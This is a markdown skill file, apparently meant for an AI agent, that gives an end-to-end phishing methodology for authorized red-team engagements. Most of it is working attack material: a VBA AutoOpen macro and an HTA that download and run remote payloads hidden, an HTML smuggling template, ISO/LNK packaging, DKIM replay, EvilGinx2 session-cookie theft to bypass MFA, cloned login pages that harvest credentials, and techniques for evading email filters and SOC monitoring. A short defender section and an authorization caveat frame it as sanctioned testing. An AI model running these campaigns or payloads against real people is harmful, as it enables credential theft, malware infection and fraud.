---
name: offensive-phishing
description: "Phishing campaign execution methodology for authorized red team engagements. Covers end-to-end campaign lifecycle: infrastructure provisioning (GoPhish, SMTP relay configuration, domain acquisition and aging, SPF/DKIM/DMARC alignment), payload delivery vectors (Office macro weaponization, HTA droppers, ISO/IMG container abuse, LNK shortcut hijacking, OneNote embedded payloads, HTML smuggling), email authentication bypass techniques (SPF softfail exploitation, DKIM replay attacks, display name spoofing, homoglyph and cousin domain registration), credential harvesting with MFA bypass (EvilGinx2 transparent proxy, Modlishka session relay, pixel-perfect HTML cloning), spear phishing pretext development informed by OSINT, email security gateway evasion, QR code phishing (quishing), and callback phishing for initial access. Integrates with GoPhish for campaign management, EvilGinx2 for adversary-in-the-middle credential interception, King Phisher for template design, and the Social Engineering Toolkit for payload generation. Maps to MITRE ATT&CK T1566 (Phishing) and sub-techniques T1566.001 (Spearphishing Attachment), T1566.002 (Spearphishing Link), T1566.003 (Spearphishing via Service). Assumes you have written authorization and a defined scope before any campaign execution."
---

# Offensive Phishing

Phishing remains the most reliable initial access vector in red team engagements. You are simulating a real adversary -- your infrastructure, pretexts, and payloads must withstand the same scrutiny that a targeted organization's email security stack applies to inbound mail. This skill walks you through building campaigns that test an organization's human and technical defenses against email-based social engineering.

Every technique here assumes you hold explicit written authorization. Document your scope, target lists, and escalation procedures before sending the first email.

## Quick Workflow

1. Register a lookalike domain 4-8 weeks before the engagement; configure DNS records for SPF, DKIM, and DMARC alignment.
2. Stand up GoPhish on dedicated infrastructure; configure SMTP relay through a reputable provider or self-hosted MTA.
3. Develop pretexts based on OSINT -- org announcements, vendor relationships, internal processes.
4. Build or clone landing pages; deploy EvilGinx2 phishlets if MFA bypass is in scope.
5. Craft payloads matched to the target's email security posture (macro-enabled docs, HTML smuggling, ISO containers).
6. Send test emails to your own accounts first; verify rendering, link tracking, and payload delivery.
7. Launch the campaign in waves; monitor GoPhish dashboard for opens, clicks, and credential submissions.
8. Document findings with timestamps, screenshots, and affected user counts for the final report.

---

## Infrastructure Setup

Your sending infrastructure determines whether mail reaches the inbox or lands in quarantine. Treat infrastructure provisioning as the foundation of every campaign.

### Domain Acquisition and Aging

Register domains that visually or semantically resemble the target. Homoglyph substitutions (rn for m, vv for w), TLD swaps (.net instead of .com), and hyphenated variants all work. Age the domain for at least two weeks with benign content and low-volume legitimate email before using it in a campaign.

```bash
# Check domain availability and WHOIS history
whois targetcorp-portal.com
# Verify no existing reputation flags
dig +short targetcorp-portal.com @8.8.8.8

# Generate homoglyph candidates with dnstwist
dnstwist --registered targetcorp.com
```

### DNS and Email Authentication Records

Proper SPF, DKIM, and DMARC records are non-negotiable. Without them, most modern email gateways will reject or quarantine your mail outright.

```bash
# SPF record -- authorize your sending IP
# Add as TXT record on your phishing domain:
# v=spf1 ip4:203.0.113.50 -all

# Generate DKIM keys (2048-bit RSA)
opendkim-genkey -s mail -d targetcorp-portal.com -b 2048

# DMARC record -- set policy to none during warmup
# _dmarc.targetcorp-portal.com TXT "v=DMARC1; p=none; rua=mailto:dmarc@targetcorp-portal.com"

# Verify DNS propagation
dig TXT targetcorp-portal.com
dig TXT mail._domainkey.targetcorp-portal.com
dig TXT _dmarc.targetcorp-portal.com
```

### GoPhish Deployment

GoPhish is the standard open-source phishing framework. Deploy it on a VPS with a valid TLS certificate.

```bash
# Download and extract GoPhish
wget https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip
unzip gophish-v0.12.1-linux-64bit.zip -d /opt/gophish

# Generate TLS certificate with Let's Encrypt
certbot certonly --standalone -d phish.targetcorp-portal.com

# Configure GoPhish (config.json)
cat <<'EOF' > /opt/gophish/config.json
{
  "admin_server": {
    "listen_url": "0.0.0.0:3333",
    "use_tls": true,
    "cert_path": "/etc/letsencrypt/live/phish.targetcorp-portal.com/fullchain.pem",
    "key_path": "/etc/letsencrypt/live/phish.targetcorp-portal.com/privkey.pem"
  },
  "phish_server": {
    "listen_url": "0.0.0.0:443",
    "use_tls": true,
    "cert_path": "/etc/letsencrypt/live/phish.targetcorp-portal.com/fullchain.pem",
    "key_path": "/etc/letsencrypt/live/phish.targetcorp-portal.com/privkey.pem"
  }
}
EOF

# Start GoPhish
cd /opt/gophish && ./gophish &
```

### SMTP Configuration

Self-hosted Postfix or a relay through Amazon SES, Mailgun, or SendGrid. Self-hosted gives you full control but requires careful IP reputation management.

```bash
# Postfix main.cf essentials for phishing relay
postconf -e "myhostname = mail.targetcorp-portal.com"
postconf -e "mydomain = targetcorp-portal.com"
postconf -e "smtp_tls_security_level = may"
postconf -e "smtp_tls_note_starttls_offer = yes"
postconf -e "milter_default_action = accept"
postconf -e "smtpd_milters = inet:localhost:8891"
postconf -e "non_smtpd_milters = inet:localhost:8891"

systemctl restart postfix
```

---

## Payload Delivery Vectors

Match your payload to the target's email gateway capabilities. If the organization strips macros, pivot to HTML smuggling or ISO containers.

### Office Macro Payloads

Classic but still effective against organizations that allow macro-enabled documents. Use VBA stomping to remove the readable source while preserving the p-code.

```vba
' Basic macro payload -- download and execute
' Place in ThisDocument or Auto_Open module
Sub AutoOpen()
    Dim url As String
    Dim path As String
    url = "https://cdn.targetcorp-portal.com/update.exe"
    path = Environ("TEMP") & "\svchost.exe"
    
    Dim xhr As Object
    Set xhr = CreateObject("MSXML2.XMLHTTP")
    xhr.Open "GET", url, False
    xhr.send
    
    Dim stream As Object
    Set stream = CreateObject("ADODB.Stream")
    stream.Open
    stream.Type = 1
    stream.Write xhr.responseBody
    stream.SaveToFile path, 2
    stream.Close
    
    Shell path, vbHide
End Sub
```

### HTML Smuggling

Bypass email gateways by encoding the payload in JavaScript and reconstructing it client-side. The email contains only HTML -- no attachments for the gateway to scan.

```html
<!-- HTML smuggling template -->
<html>
<body>
<p>Please wait while your document loads...</p>
<script>
// Base64-encoded payload (ISO, EXE, or DLL)
var payload = "TVqQAAMAAAAEAAAA..."; // truncated
var raw = atob(payload);
var arr = new Uint8Array(raw.length);
for (var i = 0; i < raw.length; i++) {
    arr[i] = raw.charCodeAt(i);
}
var blob = new Blob([arr], {type: "application/octet-stream"});
var url = window.URL.createObjectURL(blob);
var a = document.createElement("a");
a.href = url;
a.download = "Q3-Report.iso";
document.body.appendChild(a);
a.click();
window.URL.revokeObjectURL(url);
</script>
</body>
</html>
```

### ISO/IMG Container Abuse

ISO and IMG files mount automatically on Windows 10/11, bypassing Mark-of-the-Web protections. Package an LNK file pointing to an embedded DLL or executable inside the container.

```bash
# Create an ISO with a malicious LNK and hidden payload
# First, prepare the directory structure
mkdir -p /tmp/iso_payload
cp payload.dll /tmp/iso_payload/
# Create an LNK that executes the DLL via rundll32
# (use pylnk3 or mklnk for programmatic LNK creation)

python3 -c "
import pylnk3
lnk = pylnk3.Lnk()
lnk.target = r'C:\Windows\System32\rundll32.exe'
lnk.arguments = r'payload.dll,DllMain'
lnk.icon_file = r'C:\Windows\System32\shell32.dll'
lnk.icon_index = 1
lnk.save('/tmp/iso_payload/Q3-Report.lnk')
"

# Generate the ISO
mkisofs -o /tmp/Q3-Report.iso -J -r /tmp/iso_payload/
```

### OneNote Embedded Payloads

OneNote files (.one) can embed scripts, executables, and HTA files. The user sees a "Double-click to open" prompt. Effective against environments that block Office macros.

```bash
# Use o365creeper or custom tooling to craft .one files
# OneNote payload embedding approach:
# 1. Create a legitimate-looking OneNote page
# 2. Embed a malicious HTA or BAT file as an attachment
# 3. Place a visual overlay instructing the user to "double-click to view"

# Example HTA payload embedded in OneNote
cat <<'HTAEOF' > payload.hta
<html>
<head>
<script language="VBScript">
Sub Window_onLoad
    Set shell = CreateObject("WScript.Shell")
    shell.Run "powershell -ep bypass -w hidden -c IEX((New-Object Net.WebClient).DownloadString('https://cdn.targetcorp-portal.com/stage2.ps1'))", 0
    window.close
End Sub
</script>
</head>
</html>
HTAEOF
```

---

## Email Authentication Bypass

Understanding email authentication lets you exploit gaps between strict policy and actual enforcement.

### SPF Softfail Exploitation

Many organizations configure SPF with ~all (softfail) instead of -all (hardfail). Softfail messages are tagged but often delivered, especially when combined with valid DKIM.

```bash
# Check target's SPF record for softfail
dig TXT targetcorp.com | grep spf

# If ~all is present, send from any IP -- the message gets tagged
# but typically passes through to the inbox
# Combine with valid DKIM on your own domain for best results
```

### DKIM Replay Attacks

Send a legitimate email through a service that signs with DKIM, then replay the signed message body with modified envelope headers.

```python
# DKIM replay concept
# 1. Send a message through a legitimate service (e.g., a newsletter platform)
#    that DKIM-signs with a domain the target trusts
# 2. Capture the raw signed message
# 3. Modify the envelope From/To while preserving the DKIM-signed body

import smtplib
from email import message_from_file

# Load the captured DKIM-signed message
with open("signed_message.eml", "r") as f:
    msg = message_from_file(f)

# Modify envelope (not headers) and relay
with smtplib.SMTP("mail.targetcorp-portal.com", 25) as smtp:
    smtp.starttls()
    smtp.sendmail(
        "noreply@trusted-service.com",   # envelope from
        "victim@targetcorp.com",          # envelope to
        msg.as_string()                   # original DKIM-signed content
    )
```

### Display Name Spoofing and Homoglyph Domains

The simplest bypass -- set the display name to match a trusted sender. Most email clients show the display name prominently and hide the actual address.

```text
From: "IT Security Team <security@targetcorp.com>" <attacker@targetcorp-portal.com>
Subject: Mandatory Password Reset - Action Required

Combined with a homoglyph domain:
  targetcorp.com  vs  targetc0rp.com  (zero for o)
  targetcorp.com  vs  targe7corp.com  (seven for t)
  targetcorp.com  vs  targetcorp.co   (TLD change)
```

---

## Credential Harvesting with MFA Bypass

Modern credential harvesting goes beyond cloned login pages. You need to intercept session tokens to bypass MFA.

### EvilGinx2 Transparent Proxy

EvilGinx2 operates as a reverse proxy between the victim and the real authentication portal. It captures credentials AND session cookies, bypassing TOTP, push notifications, and SMS-based MFA.

```bash
# Install EvilGinx2
git clone https://github.com/kgretzky/evilginx2.git
cd evilginx2
make

# Configure and run
./evilginx2 -p phishlets/

# Inside the EvilGinx2 console:
config domain targetcorp-portal.com
config ipv4 203.0.113.50

# Load the Microsoft 365 phishlet
phishlets hostname o365 login.targetcorp-portal.com
phishlets enable o365

# Create a lure URL
lures create o365
lures get-url 0
# Output: https://login.targetcorp-portal.com/some-path

# When the victim authenticates, EvilGinx2 captures:
# - Username and password
# - Session cookies (bypasses MFA)
# - Authorization tokens
```

### HTML Login Page Cloning

For scenarios where transparent proxying is not feasible, clone the target login page and POST credentials to your collection server.

```bash
# Clone a login page with wget
wget --mirror --convert-links --page-requisites \
     --no-parent https://login.targetcorp.com/

# Modify the form action to POST to your server
# In the cloned HTML, change:
#   <form action="/auth/login" method="POST">
# To:
#   <form action="https://phish.targetcorp-portal.com/collect" method="POST">

# GoPhish handles this natively -- import the HTML as a landing page
# and GoPhish will intercept form submissions automatically
```

---

## Spear Phishing and Pretext Development

Mass phishing tests awareness; spear phishing tests whether a motivated attacker can compromise a specific high-value target.

### OSINT-Driven Pretext Construction

Build pretexts from publicly available information: LinkedIn profiles, conference talks, social media, SEC filings, job postings.

```bash
# Gather target intelligence
# LinkedIn scraping for org chart and role identification
theHarvester -d targetcorp.com -b linkedin

# Email format enumeration
python3 -c "
# Common email formats to test
import itertools
first = 'john'
last = 'smith'
domain = 'targetcorp.com'
formats = [
    f'{first}.{last}@{domain}',
    f'{first[0]}{last}@{domain}',
    f'{first}{last[0]}@{domain}',
    f'{first}_{last}@{domain}',
    f'{first}@{domain}',
]
for fmt in formats:
    print(fmt)
"

# Verify emails with SMTP VRFY or RCPT TO
smtp-user-enum -M RCPT -U emails.txt -t mail.targetcorp.com
```

### Pretext Examples by Scenario

```text
Scenario: IT department password reset
  From: IT Helpdesk <helpdesk@targetcorp-portal.com>
  Pretext: Annual security compliance requires password rotation.
  Urgency: Account lockout in 24 hours.
  Landing: Cloned SSO portal.

Scenario: Vendor invoice
  From: accounts@vendor-corp.com (compromised or spoofed)
  Pretext: Updated banking details for upcoming payment.
  Payload: Macro-enabled Excel "invoice."

Scenario: Shared document notification
  From: DocuSign <no-reply@docusign-notifications.com>
  Pretext: HR document awaiting signature.
  Landing: Credential harvesting page styled as DocuSign.

Scenario: Callback phishing (BazarCall)
  From: subscription@streaming-service-portal.com
  Pretext: Subscription renewal charge of $499.99.
  Action: Call this number to cancel (leads to vishing agent).
```

---

## Email Filter Bypass Techniques

Email security gateways inspect URLs, attachments, headers, and content. Your goal is to deliver the payload without triggering detections.

### Techniques for Evasion

```text
URL obfuscation:
  - Use URL shorteners (bit.ly, tinyurl) for initial link
  - Redirect chains: benign domain -> 302 -> phishing page
  - Open redirects on trusted domains (Google, Microsoft, Adobe)
  - Time-delayed redirects (serve benign page during sandbox analysis)

Attachment evasion:
  - Password-protected ZIP files (password in email body)
  - Nested archives (ZIP inside ZIP)
  - Rename extensions (.doc.iso, .pdf.lnk)
  - Use less-scrutinized formats (SVG with embedded JS, .url files)

Content evasion:
  - Invisible text / zero-font to confuse NLP classifiers
  - Image-based email body (text rendered as PNG)
  - Base64-encoded body sections
  - Right-to-left override characters in filenames
```

### QR Code Phishing (Quishing)

QR codes in email bodies bypass URL scanners because the link is encoded in an image, not a clickable href.

```python
# Generate a QR code pointing to your phishing URL
import qrcode

url = "https://login.targetcorp-portal.com/auth"
qr = qrcode.QRCode(version=1, box_size=10, border=4)
qr.add_data(url)
qr.make(fit=True)
img = qr.make_image(fill_color="black", back_color="white")
img.save("mfa_setup_qr.png")

# Embed in an email with pretext:
# "Scan this QR code with your phone to complete MFA enrollment"
```

---

## Detection / Defender View

Understanding how defenders detect phishing helps you build campaigns that realistically test those controls.

| Control Layer | Detection Method | Attacker Consideration |
|---|---|---|
| Email gateway (Proofpoint, Mimecast) | URL reputation, attachment sandbox, header analysis | Use fresh domains, time-delayed payloads, encrypted attachments |
| SPF/DKIM/DMARC enforcement | Authentication header validation | Ensure proper alignment on your sending domain |
| Link protection (SafeLinks, URL Defense) | URL rewriting and detonation at click time | Redirect chains, captcha gates before payload |
| User awareness training | Reported phishing, suspicious email buttons | Higher sophistication pretexts, spear phishing |
| EDR / endpoint controls | Payload execution blocking | Test payload execution separately; not the phishing skill's scope |
| SIEM / SOC monitoring | Bulk credential submission alerts, impossible travel | Stagger campaign waves, use residential proxies |

Defenders should look for: newly registered domains in inbound mail, DMARC failures tagged but delivered, unusual login geography after campaign windows, and spikes in password reset requests.

---

## Engagement Cheatsheet

```text
PRE-ENGAGEMENT
  [ ] Written authorization and scope document signed
  [ ] Target list approved (no out-of-scope individuals)
  [ ] Deconfliction contacts established with blue team (if not blind)
  [ ] Domain registered and aging (minimum 2 weeks, ideally 4-8)
  [ ] DNS records configured (SPF, DKIM, DMARC)
  [ ] GoPhish deployed and tested
  [ ] Landing pages cloned and functional
  [ ] Payloads tested against target email gateway (send to yourself first)

EXECUTION
  [ ] Test email sent to operator's own mailbox -- verify rendering
  [ ] Campaign launched in waves (stagger send times)
  [ ] Monitor GoPhish dashboard for opens, clicks, credential captures
  [ ] Screenshot all credential captures with timestamps
  [ ] If callback phishing: vishing team briefed and ready

POST-ENGAGEMENT
  [ ] Campaign stopped; no further emails sent
  [ ] All collected credentials securely stored and reported
  [ ] Infrastructure torn down (domains, servers, GoPhish data)
  [ ] Phishing simulation results compiled with per-department metrics
  [ ] Recommendations: email gateway tuning, DMARC enforcement, user training
```

---

## Key References

- MITRE ATT&CK T1566 -- Phishing (T1566.001 Attachment, T1566.002 Link, T1566.003 Service)
- GoPhish Documentation -- https://docs.getgophish.com
- EvilGinx2 -- https://github.com/kgretzky/evilginx2
- King Phisher -- https://github.com/rsmusllp/king-phisher
- Social Engineering Toolkit (SET) -- https://github.com/trustedsec/social-engineer-toolkit
- dnstwist -- Domain permutation engine -- https://github.com/elceef/dnstwist
- NIST SP 800-177 -- Trustworthy Email
- RFC 7208 (SPF), RFC 6376 (DKIM), RFC 7489 (DMARC)
